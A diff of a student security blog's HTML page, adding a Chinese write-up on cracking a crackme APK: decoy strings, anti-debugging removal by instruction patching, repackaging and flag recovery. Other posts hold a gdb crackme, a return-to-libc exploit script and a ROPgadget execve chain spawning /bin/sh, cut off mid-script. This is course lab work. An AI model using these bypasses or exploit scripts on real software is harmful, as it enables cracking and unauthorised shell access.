@@ -160,6 +160,175 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/18/%E9%80%86%E5%90%91/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Imane">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Imane's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/04/18/%E9%80%86%E5%90%91/" class="post-title-link" itemprop="url">逆向</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-04-18 14:09:01" itemprop="dateCreated datePublished" datetime="2021-04-18T14:09:01+08:00">2021-04-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-05-17 16:00:46" itemprop="dateModified" datetime="2021-05-17T16:00:46+08:00">2021-05-17</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">逆向</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="apk逆向分析实验"><a href="#apk逆向分析实验" class="headerlink" title="apk逆向分析实验"></a>apk逆向分析实验</h3><p><strong>1.</strong>   <strong>实验环境</strong></p>
+<p>(1) 逍遥模拟器；</p>
+<p>(2) AndroidKiller软件；</p>
+<p>(3) IDA Pro 7.0软件。</p>
+<p><strong>2.</strong>   <strong>实验内容</strong></p>
+<p>结合Android程序实例“Crackme_2.apk”，完成以下工作：</p>
+<p>（1）分析Android程序执行的过程，及核心代码的地址和范围；</p>
+<p>（2）程序中关键信息混淆的方法，并还原相关内容；</p>
+<p>（3）程序中反调试方法；</p>
+<p>（4）还原程序中被加密的代码，结合还原后的代码重新打包生成程序，并确保程序能够正常运行；</p>
+<p>（5）在上述工作基础上，获取实例代码中的“flag”，并进行验证。</p>
+<p><strong>3.</strong>   <strong>实验目标</strong></p>
+<p>(1 ) 借助于IDA工具，逆向实例程序，根据Android程序执行过程，定位核心代码；</p>
+<p>(2) 分析程序在初始化过程中，如何完成对关键信息的混淆，根据分析的结果，还原这些关键信息；</p>
+<p>(3) 分析程序中反调试的方法；</p>
+<p>(4) 借助于指令修改工具，去除反调试代码；</p>
+<p>(5) 通过静态分析方法，对核心代码进行还原;</p>
+<p>(6) 根据反编译的伪C代码，跟踪相关信息；</p>
+<p>(7) 以“flag”可能涉及到的变量为线索，跟踪“flag”相关的信息；</p>
+<p>尝试恢复“flag”。</p>
+<p><strong>4.</strong>   <strong>分析方法和过程</strong></p>
+<p>首先使用安卓模拟器打开需要破解的apk文件，Crackme_2.apk，如图所示：</p>
+<p><img src="/2021/04/18/%E9%80%86%E5%90%91/apk1.png" alt="img"></p>
+<p>程序提示我们输入密码，随便输入“aaa”看它会出现什么提示，输入后显示“验证码校验失败”，如图所示：</p>
+<p><img src="/2021/04/18/%E9%80%86%E5%90%91/apk2.png" alt="img"></p>
+<p>​    知道了错误输出之后，我们就可以去寻找对应的字符串了。将apk放入android killer中，android killer经过分析找到了程序的入口，点击即可进入，如图所示：</p>
+<p><img src="/2021/04/18/%E9%80%86%E5%90%91/apk3.png" alt="img"></p>
+<p>​    使用搜索功能搜索“验证码”，但是没有找到相关的字符串，如图所示：</p>
+<p><img src="/2021/04/18/%E9%80%86%E5%90%91/apk4.png" alt="img"></p>
+<p>​    我们尝试将main_activity.smali反编译，看看能不能看出点什么，如图所示，找到了错误字符串：</p>
+<p><img src="/2021/04/18/%E9%80%86%E5%90%91/apk5.png" alt="img"></p>
+<p>​    仔细分析下图所示的反编译java代码，可以知道，第一个static块用于加载库文件crackme，这肯定是该程序实现的主要功能所在，可惜它并不在main_activity里面；第二个onCreate函数中间很多代码，我们不去管，仅仅看有“验证码校验失败”的部分，看到包含该字符串的方法命名为makeText，顾名思义，该方法用于创建“验证码校验失败”这个提示弹窗，那么激活这个创建弹窗的程序部分，才是我们所需要的；最后有一个native标识的securityCheck方法，native代表该方法并不是java内部所定义的，该方法是java调用一个非java代码的接口，根据这个名字我们猜测它的功能很重要。这样main_activity的分析就结束了，我们先去找crackme链接库。</p>
+<p><img src="/2021/04/18/%E9%80%86%E5%90%91/apk6.png" alt="img"></p>
+<p>​    首先点击android killer的工程管理器，在lib文件夹中找到libcrackme.so库文件，如图所示:</p>
+<p><img src="/2021/04/18/%E9%80%86%E5%90%91/apk7.png" alt="img"></p>
+<p>​    双击它发现全是乱码，如图所示，可知android killer不能解析.so文件，我们先将apk后缀改为zip，再用压缩工具将该apk解压，用ida pro打开.so文件。</p>
+<p><img src="/2021/04/18/%E9%80%86%E5%90%91/apk8.png" alt="img"></p>
+<p>​    接着尝试在函数表中搜索crack，找到了包含crack的函数，如图所示，看名字应该就是我们所需要的。</p>
+<p><img src="/2021/04/18/%E9%80%86%E5%90%91/apk9.png" alt="img"></p>
+<p>​    反汇编该代码，如图所示，可以看到变量命名可读性很差，但是有一个while循环函数，我们猜测它是用来字符串比对，仔细阅读可以发现，v7变量用于暂存v6字符串当前的值，接着将v7字符和v5地址处的字符串逐个比较，倘若不同则退出循环返回0，如果比对到最后都相同，并且v7 == 0（即到了字符串的末尾），则说明字符串比对成功，返回1.那么v6和v5两个地址必然一个指向我们需要的目标字符串，一个指向我们的输入字符串。我们可以看到，v6地址等于一个地址块首地址，点击它查看该处的字符串信息。</p>
+<p><img src="/2021/04/18/%E9%80%86%E5%90%91/apk10.png" alt="img"></p>
+<p>​    进入后可以看到字符串“wojiushidaan”，如图所示，很显然这就是“我就是答案”的全拼，于是激动地将其输入，发现结果不对。可以反思自己的分析过程应该是没有错的，那么就只有可能这个函数并不是用来和真正的目标字符串比对的，这个“wojiushidaan”字符串是程序特地设计出来要迷惑我们的。</p>
+<p><img src="/2021/04/18/%E9%80%86%E5%90%91/apk11.png" alt="img"></p>
+<p>​    那么此时静态分析已经黔驴技穷了，我们准备进行<strong>动态分析</strong>。</p>
+<p>​    首先做好动态分析的准备，下载adb（android debug bridge）工具，直接下载windows下的SDK Platform Tools到d盘，解压后可以看到里面有adb.exe，在该目录下打开终端，执行.\adb可以看到帮助选项。</p>
+<p>​    接着打开模拟器（我用的是逍遥模拟器），找到设备的版本号连点5次，打开开发者模式，于是就可以开启usb调试功能。接着查找逍遥模拟器的端口号是21503，输入命令adb connect 127.0.0.1:21503连接到该模拟器</p>
+<p>然后我们使用命令：adb connect 127.0.0.1:21503连接到该模拟器，从而可以进行动态调试，接着使用命令：adb devices查看已经连接的设备，可以看到已经成功连接至该模拟器，如图所示：</p>
+<p><img src="/2021/04/18/%E9%80%86%E5%90%91/apk12.png" alt="img"></p>
+<p>​    接着我们到IDA pro的dbgsrv目录下找到android_server，用adb命令将其push 到Android的data/local/tmp目录下，使用命令：adb push，如图所示：</p>
+<p><img src="/2021/04/18/%E9%80%86%E5%90%91/apk13.png" alt="img"></p>
+<p>​    接下来就可以使用adb shell命令进入安卓端的命令行，然后使用su命令提权，进入到/data/local/tmp目录下，给android_server赋予最高权限，输入命令：chmod 777 android_server，再输入命令：./an*，运行该server，监听端口，如图所示：</p>
+<p><img src="/2021/04/18/%E9%80%86%E5%90%91/apk14.png" alt="img"></p>
+<p>​    别忘了还需要进行端口映射，再打开一个命令行，输入adb forward tcp:23946 tcp:23946，进行PC端和安卓端的端口映射，这样就可以开始动态调试了，如图所示：</p>
+<p><img src="/2021/04/18/%E9%80%86%E5%90%91/apk15.png" alt="img"></p>
+<p>​    我们用IDA pro打开libcrackme.so文件，然后点击“Debugger”→“Switch Debugger”，选择“Remote ARM Linux/Android debugger”， 接着在Debugger Options中选择如图所示的选项：</p>
+<p><img src="/2021/04/18/%E9%80%86%E5%90%91/apk16.png" alt="img"></p>
+<p>在“Process Options”里面将local host填为127.0.0.1，如图所示</p>
+<p><img src="/2021/04/18/%E9%80%86%E5%90%91/apk17.png" alt="img"></p>
+<p>​    然后在模拟器中打开crackme程序，在IDA pro中“Debugger”中选择“Attach to process”准备调试安卓模拟器（手机端）中的进程,搜索“crackme”即可找到com.yaotong.crackme这个进程，点击进去开始动态运行，如图所示：</p>
+<p><img src="/2021/04/18/%E9%80%86%E5%90%91/apk18.png" alt="img"></p>
+<p>​    但是十分遗憾，一点击这个进程，模拟器中的crackme程序就直接闪退掉了，这说明crackme程序本身可能对调试功能做了什么处理，增加了反调试功能。但是这也没关系，我们找到反调试部分将其用二进制编辑器去掉即可。</p>
+<p>​    结合课堂上讲的知识，我们知道反调试代码可能出现在.init_array和JNI_Onload中，首先进入init_array查看，打开view-&gt;open subviews-&gt;segements，找到init_array函数，如图所示：</p>
+<p><img src="/2021/04/18/%E9%80%86%E5%90%91/apk19.png" alt="img"></p>
+<p>​    进去查看是初始化过程，并没有找到反调试相关信息,于是去找JNI_Onload函数,如图所示,在JNI_Onload函数中我们看到了一个可疑的大循环,但是仔细分析之后仍然什么都看不出来,只能找找其他的可以点击的函数名or地址块(变量名)来寻找可以分析的信息了。</p>
+<p><img src="/2021/04/18/%E9%80%86%E5%90%91/apk20.png" alt="img"></p>
+<p>  我们发现下图1所示代码中的sub_16A4函数点开之后是比较明晰的C代码,如下图2所示:</p>
+<p><img src="/2021/04/18/%E9%80%86%E5%90%91/apk21.png" alt="img"></p>
+<p><img src="/2021/04/18/%E9%80%86%E5%90%91/apk22.png" alt="img"></p>
+<p>​    我们可以看到这个循环的循环体只是执行sub_130C函数,点进去看一看,又有一个大循环,虽然还是不明白循环的作用,但是找到了循环体的一个出口,如图所示,当v12&gt;=1就跳出该循环。我们猜测该循环是为了检测程序是否启动了调试，如果没有启动就一直检测，启动了就立即跳出循环退出。那么我们尝试将跳出循环部分删除,改成arm架构的空指令: 00 00 A0 E1。</p>
+<p><img src="/2021/04/18/%E9%80%86%E5%90%91/apk23.png" alt="img"></p>
+<p>我们将修改过的.so文件替换原apk中的.so文件,利用android_killer重新打包成apk: 点击“Android”→“编译”，对该apk文件重新进行编译和签名。将新的apk文件放入模拟器中,删除原来的,再次执行adb连接等动态调试准备动作,用ida动态调试修改过的.so文件。</p>
+<p>进入crackme程序进程后，我们点击modules，在其中搜索crackme，找到libcrackme.so模块进程，如图所示： </p>
+<p><img src="/2021/04/18/%E9%80%86%E5%90%91/apk24.png" alt="img"></p>
+<p>点击第一个，进入后可以看到该进程就两个功能函数，一个是我们开头分析过的main_activity，另一个是一个交jolin的函数，如图所示：</p>
+<p><img src="/2021/04/18/%E9%80%86%E5%90%91/apk25.png" alt="img"></p>
+<p>我们知道libcrackme.so是实现程序功能的重要文件，那么其中除了main_activity，另外的函数肯定就是我们的功能函数，所以进入jolin看看，如图所示：</p>
+<p><img src="/2021/04/18/%E9%80%86%E5%90%91/apk26.png" alt="img"></p>
+<p>​    点击TAB键将其反编译成c代码，替换其中的ascii码为字符，如图所示：</p>
+<p><img src="/2021/04/18/%E9%80%86%E5%90%91/apk27.png" alt="img"></p>
+<p>​    已经胜利在望了，我们可以看到，目标字符串是“aiyo_,bu_uoo”，下划线处的字母很容易猜到是’u’和’c’，于是先将猜测的字符串输入程序中。</p>
+<p>​    输入“aiyou,bucuoo”，程序显示破解成功，如图所示：</p>
+<p><img src="/2021/04/18/%E9%80%86%E5%90%91/apk28.png" alt="img"></p>
+<p><strong>5.</strong>   <strong>实验结论</strong></p>
+<p>本次实验难度比上次大很多，仅仅静态调试无法完成破解，因为程序加密了，于是进入动态调试。静态调试部分忧伤一个实验的基础，进行起来比较顺利，动态调试是从零开始，也遇到了许多困难，问了一些同学查找了很多资料，才慢慢地解决，最后完成破解。</p>
+<p>记录一下遇到的问题和解决方法：</p>
+<ol>
+<li><p>我一开始使用的模拟器是蓝叠模拟器，一直会遇到adb检测到两个devices的问题，在网上找了很多办法，包括更改adb的默认搜索端口，设置环境变量等等，都不起作用，最后用taskkill命令强制删除占用端口号的device，才能正常push android_server到模拟器中。</p>
+</li>
+<li><p>Push成功之后无法使用su功能给命令行提权，虽然使用chmod给android_server降低了权限，但是仅仅能执行它，却不能在ida中找到模拟器中的所有进程，只能找到手机终端的进程。搜索之后解决办法是使用adb root start-server以root权限打开start-server，但是打开后也并没有成功。无奈之下只能换一个模拟器重新开始。</p>
+</li>
+<li><p>换了逍遥模拟器之后，ida可以很顺利地attach进程，但是当我尝试在其中找JNI_Onload函数的时候却搜索不到。我去静态分析过程中找到JNI_Onload函数地偏移地址，再到动态分析中找到.so模块的基址，相加之后得到JNI_Onload的绝对地址，按G jmp过去后发现空空如也，没有代码。于是我只能另辟蹊径，点开.so模块，看看里面有些什么函数，比较出人意料的是只有两个函数，应该是因为什么原因ida没有将进程加载完全。但是仅根据已有的信息，已经能够破解字符串了。</p>
+</li>
+</ol>
+<p><strong>6.</strong>   <strong>实验心得</strong></p>
+<p>这次实验是我第一次接触安卓程序，也是第一次接触java代码，一开始上课听老师讲感觉一知半解的，破解过程似乎也很复杂，但是实验做完将其破解之后再回过头来卡课堂上讲的就很清晰易懂了。所以这也说明了通过此次实验我学到了很多东西，并且真正动手完成了一个比较复杂的程序的破解，感觉还是有一些成就感。</p>
+<p>另外一点感受就是逆向分析破解程序，可以有很多种方法去完成破解，当一种方法走不通可以尝试另一种方法，比如静态分析遇到了加密的代码可以用动态分析，找不到JNI_Onload可以不去找它，看看其他的函数等等。想要成功地完成逆向分析，一定要有不畏难的精神，撞到了南墙就换另一条路走；另外还需要对工具对代码结构足够地熟悉，这样才能在遇到困难时想到另一种方法去完成它。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/12/scapy%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -415,19 +584,19 @@
 <li><p>使用32位ubuntu虚拟磁盘文件创建虚拟机</p>
 </li>
 <li><p>运行homework1程序查看程序的输入输出，可以发现当随便输入字符串的时候会提示:(，如图，根据经验可猜测逆向破解出正确的字符串之后可以得到正确输出。</p>
-<p><img src="/project/%5C%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Chomework11.png" alt="homework11"></p>
+<p><img src="/%5C%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Chomework11.png" alt="homework11"></p>
 </li>
 <li><p>使用gdb调试该程序，使用<code>info functions</code>指令来列出该程序调用了哪些函数，说不定可以从函数调用中获得信息，如图，可以看到一个<code>strcmp</code>函数，很明显它是为了和正确的字符串做比对。</p>
-<p><img src="/project/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Chomework12.png" alt="homework12"></p>
+<p><img src="/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Chomework12.png" alt="homework12"></p>
 </li>
 <li><p>我们还是进入main函数，对其反汇编查看代码，如图，可以看到<code>strcmp</code>函数之前有一个<code>puts</code>函数和一个<code>gets</code>函数的调用，很显然<code>puts</code>函数是为了输出提示信息，也就是一开始看到的 <em>this is homework1</em>，<code>gets</code>函数是为了得到我们的输入。我们知道<code>strcmp</code>函数需要两个参数，一个是待比对字符串首地址，一个是目标字符串首地址；查看汇编代码我们可以看到<code>strcmp</code>调用之前<code>push</code>了两个值，一个是常数<strong>0x8048622</strong>，一个是<strong>eax</strong>（即ebp-0x70）。而在gets函数前我们可以看到也push了同样值的eax，很容易得出结论eax所指地址就是存放我们输入字符串的首地址，那么常数处就存放着我们的目标地址。</p>
-<p><img src="/project/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Chomework13.png" alt="homework12"></p>
+<p><img src="/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Chomework13.png" alt="homework12"></p>
 </li>
 <li><p>使用指令<code>x\1s 0x8048622</code>命令查看该地址处的内存信息，其中x是查看内存信息的指令，1代表长度位1，s指定输出格式为字符串，如图，得到了我们的flag：<strong>home@work@1</strong></p>
-<p><img src="/project/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Chomework14.png" alt="homework12"></p>
+<p><img src="/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Chomework14.png" alt="homework12"></p>
 </li>
 <li><p>再次执行homework1程序，输入破解出来的字符串，得到输入正确提示符ok，如图所示：</p>
-<p><img src="/project/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Chomework15.png" alt="homework12"></p>
+<p><img src="/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Chomework15.png" alt="homework12"></p>
 </li>
 </ol>
 <h3 id="2-栈溢出攻击小试"><a href="#2-栈溢出攻击小试" class="headerlink" title="2.栈溢出攻击小试"></a>2.栈溢出攻击小试</h3><p><strong>任务：</strong>利用return2libc或rop攻击，编写exploit程序来构建恶意输入文件，攻击目标为运行shell</p>
@@ -443,26 +612,26 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb ./s_gdb</span><br><span class="line">run</span><br><span class="line">p system</span><br><span class="line">p exit</span><br></pre></td></tr></table></figure>
 
 <p>结果如下图：</p>
-<p><img src="/project/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Creturn2libc1.png"></p>
+<p><img src="/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Creturn2libc1.png"></p>
 </li>
 <li><p>使用断点功能找到进入后的ebp和buffer起始地址，计算出我们需要填充的参数的相对位置，使用<code>gdb ./s_gdb</code>进入可调试程序，使用<code>b vulfunc</code>设下断点，使用<code>run</code>执行程序到断点处停下，使用<code>p $ebp</code> <code>p &amp;buffer</code>来查看ebp寄存器中存的ebp的地址以及分配给buffer的首地址，两者相减得到33是栈中存ebp的地址块首地址到buffer首地址的距离。如下图所示：</p>
-<p><img src="/project/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Creturn2libc4.png"></p>
+<p><img src="/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Creturn2libc4.png"></p>
 </li>
 <li><p>接着编写一个新的程序用来获取环境变量的地址，使用<code>gcc envraddr.c -o envraddr</code>编译它，使用<code>export MYSHELL=&quot;/bin/sh&quot;</code>将环境变量MYSHELL设置为”/bin/bash”字符串，使用<code>./envraddr</code>指令执行它。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//getenv用来获取MYSHELL环境变量的值（环境变量存的路径）和环境变量所在地址</span></span><br><span class="line">	<span class="keyword">char</span> *shell = (<span class="keyword">char</span> *)getenv(<span class="string">&quot;MYSHELL&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(shell)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;   Value: %s\n&quot;</span>, shell);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot; Address: %x\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)shell);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot; MYSHELL not found\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>结果如下图，可知我们环境变量的地址是0xbfffe18，也就是我们所需要的”/bin/sh”字符串的地址.</p>
-<p><img src="/project/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Creturn2libc2.png"></p>
+<p><img src="/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Creturn2libc2.png"></p>
 </li>
 <li><p>接下来需要将相关参数填充栈，从ebp依次栈底填充的内容是：system的地址、exit的地址、”/bin/sh”字符串的地址。编写python脚本实现这个功能：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill content with none zero values</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0xaa</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>))</span><br><span class="line"></span><br><span class="line">a3 = <span class="number">0xb7ec582b</span> <span class="comment"># address of &quot;/bin/sh&quot;</span></span><br><span class="line">content[<span class="number">45</span>:<span class="number">49</span>] = (a3).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">a2 = <span class="number">0xb7d989d0</span> <span class="comment"># address of exit()</span></span><br><span class="line">content[<span class="number">41</span>:<span class="number">45</span>] = (a2).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">a1 = <span class="number">0xb7da4da0</span> <span class="comment"># address of system()</span></span><br><span class="line">content[<span class="number">37</span>:<span class="number">41</span>] = (a1).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;badfile&quot;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line">file.write(content)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure></li>
 <li><p>最后我们执行python脚本就可以把恶意输入填充到badfile里，接着运行我们有漏洞的程序就可以实现攻击。</p>
 </li>
 <li><p>出现了一点问题，攻击没有反应，我们只能换个”/bin/sh”字符串地址来试试，我们尝试在gdb运行漏洞程序的时候（先在main函数处加断点，再run）加载在内存中查找字符串，使用命令<code>searchmem &quot;/bin/sh&quot;</code>，查找的结果如图所示，用新的地址替换python程序中的地址，再次尝试。</p>
-<p><img src="/project/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Creturn2libc5.png"></p>
+<p><img src="/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Creturn2libc5.png"></p>
 </li>
 <li><p>终于成功了，结果如下，成功出现了新的shell输入端。</p>
-<p><img src="/project/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Creturn2libc6.png"></p>
+<p><img src="/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Creturn2libc6.png"></p>
 </li>
 </ol>
 <p><strong>ROP步骤：</strong></p>
@@ -474,17 +643,17 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -z noexecstack -static -g -o stack returntolibc_stack.c  #记得加static参数</span><br><span class="line">sudo sysctl -w kernel.randomize_va_space=2 #打开地址随机化</span><br></pre></td></tr></table></figure></li>
 <li><p>使用命令<code>ROPgadget --binary ./stack --ropchain</code>生成gadget链</p>
 <p>结果如下：</p>
-<p><img src="/project/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Crop1.png"></p>
-<p><img src="/project/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Crop2.png"></p>
+<p><img src="/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Crop1.png"></p>
+<p><img src="/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Crop2.png"></p>
 </li>
 <li><p>接下来我们要确定偏移地址，好把我们的gadget填充进去。进入gdb调试程序，使用<code>pattern_create 100</code>生成100个字符的随机测试字符串，再另开一个终端使用<code>echo &#39;我们的字符串&#39; &gt; badfile</code>，再<code>run</code>执行程序，我们可以看到出现了段错误，程序崩溃，此时EIP的值为0x41614141，内容是我们填充进去的’AAaA’.使用命令<code>pattern_offset 0x41614141</code>，可以得到EIP处的偏移为37，如下图2所示：</p>
-<p><img src="/project/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Crop3.png"></p>
-<p><img src="/project/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Crop4.png"></p>
+<p><img src="/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Crop3.png"></p>
+<p><img src="/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Crop4.png"></p>
 </li>
 <li><p>接着我们编写python程序，将我们的填充字符串以及gadget的利用写好输出到badfile中，其中gadget的利用我们的工具已经帮我们把python代码写好了，我们把计算出来的偏移地址之前的位置填充成37个’a’字符。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># execve generated by ROPgadget</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">&#x27;&#x27;</span></span><br><span class="line">p += <span class="number">37</span> * <span class="string">&#x27;a&#x27;</span></span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ef2b</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8836</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805492b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ef2b</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span 